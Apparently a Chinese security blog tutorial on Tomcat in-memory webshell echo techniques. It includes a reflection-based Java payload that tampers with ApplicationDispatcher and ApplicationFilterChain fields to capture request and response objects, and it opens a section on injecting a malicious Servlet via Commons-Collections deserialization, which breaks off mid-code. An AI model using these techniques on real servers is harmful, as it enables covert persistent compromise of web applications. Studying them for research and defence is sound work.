<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>Tomcat内存马回显技术 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="Tomcat内存马回显技术 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T09:38:22.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">Tomcat内存马回显技术</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="ThreadLocal-Response回显"><a href="#ThreadLocal-Response回显" class="headerlink" title="ThreadLocal Response回显"></a>ThreadLocal Response回显</h1><h2 id="回顾JSP马"><a href="#回顾JSP马" class="headerlink" title="回顾JSP马"></a>回顾JSP马</h2><p>之前说的都是利用 jsp 注入内存马，但 Web 服务器中的 jsp 编译器还是会编译生成对应的 java 文件然后进行编译加载并进行实例化，所以还是会落地。<br>但如果直接注入，比如利用反序列化漏洞进行注入，由于 request 和 response 是 jsp 的内置对象，在回显问题上不用考虑，但如果不用 jsp 文件，就需要考虑如何回显的问题。<br>其实主要要解决的问题就是如何获取 request 和 response 对象。<br>目前主流的回显技术（部分）主要有：</p>
<ul>
<li>linux 下通过文件描述符，获取 Stream 对象，对当前网络连接进行读写操作。<br>限制：必须是 linux，并且在取文件描述符的过程中有可能会受到其他连接信息的干</li>
<li>通过ThreadLocal Response回显，基于调用栈获取中获取 response 对象（ApplicationFilterChain中）<br>限制：如果漏洞在 ApplicationFilterChain 获取回显 response 代码之前，那么就无法获取到Tomcat Response进行回显。</li>
<li>通过全局存储 Response回显，寻找在Tomcat处理 Filter 和 Servlet 之前有没有存储 response 变量的对象<br>限制：会导致http包超长，但相对比较通用。</li>
</ul>
<h2 id="什么是ThreadLocal"><a href="#什么是ThreadLocal" class="headerlink" title="什么是ThreadLocal"></a>什么是ThreadLocal</h2><p>在讲基于ThreadLocal方法回显之前，我们首先需要知道ThreadLocal是拿来干什么的</p>
<blockquote>
<p>ThreadLocal的作用就是：线程安全。 ThreadLocal的本质就是一个内部的静态的map，key是当前线程的句柄，value是需要保持的值。 由于是内部静态map，不提供遍历和查询的接口，每个线程只能获取自己线程的value。 这样，就线程安全了，又提供了数据共享的能力，perfect。</p>
</blockquote>
<p>也就是说<code>ThreadLocal</code>是来保证线程安全的，干说可能也不好理解，这里拿几个例子来说明：<br>一个用来给数字加十的工具类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springshell.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NumUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">addNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add10</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        addNum = num;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> addNum + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个使用案例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springshell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.springshell.utils.NumUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">threadlocaldemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">service</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> i;</span><br><span class="line">            service.execute(()-&gt;&#123;</span><br><span class="line">                System.out.println(num + <span class="string">&quot; &quot;</span> +  NumUtil.add10(num));</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        service.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>清一色的看到结果都是29，这是为什么捏？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675795030575-2f6c6f33-d007-444e-91ac-7c0989cf145b.png#averageHue=%23262825&clientId=ua6dd1655-4fe7-4&from=paste&height=542&id=ub2bb5b84&name=image.png&originHeight=745&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1874739&status=done&style=none&taskId=uec0abb4c-ae1f-4220-8a10-063151f6d7a&title=&width=1396.3636363636363" alt="image.png"><br>这里其实可以结合条件竞争来理解，在多线程的情况下，比如线程1中for循环到数字9，由于不同线程之间变量没有隔离，这时候线程2执行到了<code>addn10</code>方法中，就接替了线程1的工作，进行+10，但是线程2中for循环只到了2。因此会输出<code>2 29</code>这样的数字，其他结果也是同样的道理</p>
<p>解决方法有很多，其中一种就是运用<code>ThreadLocal</code>创建独立的线程变量域：<br>将之前的工具类改为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NumUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ThreadLocal&lt;Integer&gt; addNumThreadLocal = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add10</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        addNumThreadLocal.set(num);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> addNumThreadLocal.get() + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这之中我们创建了ThreadLocal，之前也说了本质就是一个用于存放当前进程变量的map，ThreadLocalMap是其内部类，调用了它的set和get方法用于储存和取出变量<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675795426247-55786e74-01f5-4e97-8a4d-0a12ebba0221.png#averageHue=%232e312c&clientId=ua6dd1655-4fe7-4&from=paste&height=392&id=ua2f633c0&name=image.png&originHeight=539&originWidth=1886&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1444415&status=done&style=none&taskId=u65454419-af07-486a-89fa-de7019e8290&title=&width=1371.6363636363637" alt="image.png"><br>这样做一层隔离，输出结果也就正常了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675795475955-2dc0f7c8-4e78-478d-b66d-797b95bf7401.png#averageHue=%23212322&clientId=ua6dd1655-4fe7-4&from=paste&height=232&id=u004fd594&name=image.png&originHeight=319&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=845914&status=done&style=none&taskId=ubcc6cd35-3c03-473a-8b3f-e111cf1e301&title=&width=1396.3636363636363" alt="image.png"></p>
<h2 id="ApplicationFilterChain-internalDoFilter"><a href="#ApplicationFilterChain-internalDoFilter" class="headerlink" title="ApplicationFilterChain#internalDoFilter"></a>ApplicationFilterChain#internalDoFilter</h2><p>起一个SpringBoot程序（3.0.2），这里我起的SpringBoot版本较高，和其他博主的文章有一些小地方偏差，不过影响其实不大，我们分析SpringBoot接受请求时的调用栈：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675795827553-afa5f21e-0542-4727-bd38-766ce84453b1.png#averageHue=%23292b29&clientId=ua6dd1655-4fe7-4&from=paste&height=189&id=u66048487&name=image.png&originHeight=260&originWidth=1885&originalType=binary&ratio=1&rotation=0&showTitle=false&size=802578&status=done&style=none&taskId=ua4f2ec2d-a77d-4e5b-9315-0aba07dbfe8&title=&width=1370.909090909091" alt="image.png"><br>可以看到是不断的调用了InternalDoFilter方法（这里其实就是Agent内存马的利用点，InternalDoFilter链），我们通过观察ApplicationFilterChain这个类可以发现，他内置了两个变量<code>lastServicedRequest</code>和<code>lastServicedResponse</code>，分别都是ThreadLocal类型：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675795934548-aebee419-1cd3-442a-a466-52b27a7f5e49.png#averageHue=%232d2d28&clientId=ua6dd1655-4fe7-4&from=paste&height=204&id=u9f594f28&name=image.png&originHeight=281&originWidth=1177&originalType=binary&ratio=1&rotation=0&showTitle=false&size=532623&status=done&style=none&taskId=ucc285a23-d660-4cfa-96ae-785d4d458ab&title=&width=856" alt="image.png"><br>紧接着在<code>internalDoFilter</code>方法中对这两属性进行了赋值，但是有个前提就是要满足if的条件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675795990494-95d74e83-71e6-4010-868c-23ea77586d0b.png#averageHue=%232e2f2b&clientId=ua6dd1655-4fe7-4&from=paste&height=220&id=u2742d0dc&name=image.png&originHeight=303&originWidth=1397&originalType=binary&ratio=1&rotation=0&showTitle=false&size=679730&status=done&style=none&taskId=u2b6c755e-34d1-47dd-8bd1-1006869587b&title=&width=1016" alt="image.png"><br>可以看到这里的request和response就是我们目标对象<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675796072658-e49c1f86-db9b-498a-8051-f0195eb2b57b.png#averageHue=%232c2d2c&clientId=ua6dd1655-4fe7-4&from=paste&height=577&id=u344fc6fb&name=image.png&originHeight=793&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2158490&status=done&style=none&taskId=u240de7ad-10a8-4212-af59-e769df28a2f&title=&width=1396.3636363636363" alt="image.png"><br>至于<code>dispatcherWrapsSameObject</code>属性，默认是为false的，因此我们需要反射修改属性，这一点很容易做到，那么至此思路就是这样，第一次访问URL的时候，反射修改属性，第二次访问URL的时候就进入if了，然后获取request和response</p>
<h2 id="SpringBoot版本问题"><a href="#SpringBoot版本问题" class="headerlink" title="SpringBoot版本问题"></a>SpringBoot版本问题</h2><p>在这里说明一下一个问题，就是SpringBoot版本问题和Java版本问题，SpringBoot3和SpringBoot2在internalDoFilter中if判断条件不同：<br>SpringBoot2<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675798828346-fa246a80-c257-4287-9e20-741abe445dd3.png#averageHue=%232f2f2a&clientId=ua6dd1655-4fe7-4&from=paste&height=132&id=u34b15347&name=image.png&originHeight=181&originWidth=781&originalType=binary&ratio=1&rotation=0&showTitle=false&size=237593&status=done&style=none&taskId=u202c2953-6d39-4ae2-a325-f0a58ec8947&title=&width=568" alt="image.png"><br>SpringBoot3<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675798852859-726cb70f-c584-47b5-be40-ec53b5743ee9.png#averageHue=%2334322b&clientId=ua6dd1655-4fe7-4&from=paste&height=140&id=u31bf8ebd&name=image.png&originHeight=192&originWidth=810&originalType=binary&ratio=1&rotation=0&showTitle=false&size=263357&status=done&style=none&taskId=u9e0b002c-7102-48d3-8000-21baa86ffca&title=&width=589.0909090909091" alt="image.png"></p>
<h2 id="反射修改static-final属性"><a href="#反射修改static-final属性" class="headerlink" title="反射修改static final属性"></a>反射修改static final属性</h2><p>在SpringBoot2中<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的类型是一个<code>private static final</code>类型的属性，这种属性由于一些原因无法被反射直接修改，具体参考</p>
<p>我们可以通过反射去除final修饰符的方式达到修改的目的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675798979093-c9681cf3-1b81-46bd-a477-b78d6e0194eb.png#averageHue=%23f6f4f3&clientId=ua6dd1655-4fe7-4&from=paste&height=88&id=u5e93d115&name=image.png&originHeight=121&originWidth=691&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9059&status=done&style=none&taskId=u17b4f956-9e58-49e3-9382-bb3d165dc2b&title=&width=502.54545454545456" alt="image.png"><br>modifiers实际就是一个int类型的<code>26</code>，并且每个修饰符都有一个int的值，比如private是<code>2</code>，static是<code>8</code>，final是<code>16</code>那么我们只需要把目标属性的modifiers属性减去16，就相当于去除了final属性，而图中取反然后按位与操作就是这一步骤</p>
<h2 id="JDK版本问题"><a href="#JDK版本问题" class="headerlink" title="JDK版本问题"></a>JDK版本问题</h2><p>在JDK12+之后，我们就不能通过上述方法移除final修饰符了，会报错<code>NoSuchFiled:modifiers</code>，因此目前我只发现了低版本的这种回显方式，所以在这里我将SpringBoot降到了2.6版本，JDK降到了11</p>
<h2 id="初步构造回显"><a href="#初步构造回显" class="headerlink" title="初步构造回显"></a>初步构造回显</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.echoshell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">echoshell</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/normal&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//反射获取3个属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">        <span class="comment">//去除final修饰符</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        <span class="comment">//设置private可访问可修改</span></span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        <span class="comment">//反射修改lastServiceresponse和lastservicerequest属性的值</span></span><br><span class="line">        ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line">        ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//修改WRAP_SAME_OBJECT_FIELD值为true，进入request判断</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">wrap_same_object_fieldBoolean</span> <span class="operator">=</span> WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//第一次进入时为false和null</span></span><br><span class="line">        <span class="keyword">if</span> (!wrap_same_object_fieldBoolean || lastServicedResponse == <span class="literal">null</span> || lastServicedRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;in&quot;</span>);</span><br><span class="line">            lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//第二次进入时就进入了if赋值为了request和response，因此进入else</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">            <span class="comment">//从req中获取ServletContext对象</span></span><br><span class="line">            <span class="comment">// 第二次请求后进入 else 代码块，获取 Request 和 Response 对象，写入回显</span></span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line"></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">            System.out.println(servletContext);</span><br><span class="line">            System.out.println(servletRequest);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个初步Payload中有几个细节其实，就是几个if的判断，可以让我们第一次访问时不报错，因为我们需要访问两次，第一次赋值属性<code>WRAP_SAME_OBJECT_FIELD</code>为true，第二次进入if赋值另外2个属性<code>lastServicedResponse、lastServicedRequest</code>为request和response：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675799553689-7e44dd45-8165-4ad5-8fe2-b16ec2e09703.png#averageHue=%231f211f&clientId=ua6dd1655-4fe7-4&from=paste&height=214&id=uc2743014&name=image.png&originHeight=294&originWidth=1828&originalType=binary&ratio=1&rotation=0&showTitle=false&size=825427&status=done&style=none&taskId=u6b27006e-81d2-4acf-b0eb-3c56373be73&title=&width=1329.4545454545455" alt="image.png"><br>成功获得request和response以及context对象</p>
<h2 id="反序列化打入Servlet内存马"><a href="#反序列化打入Servlet内存马" class="headerlink" title="反序列化打入Servlet内存马"></a>反序列化打入Servlet内存马</h2><p>首先构造恶意Servlet内存马,我这里是使用CC3进行打入，记得控制cc的版本和JDK的版本，我这儿是CC3.2.1和JDK1.8，仅供大家参考</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span 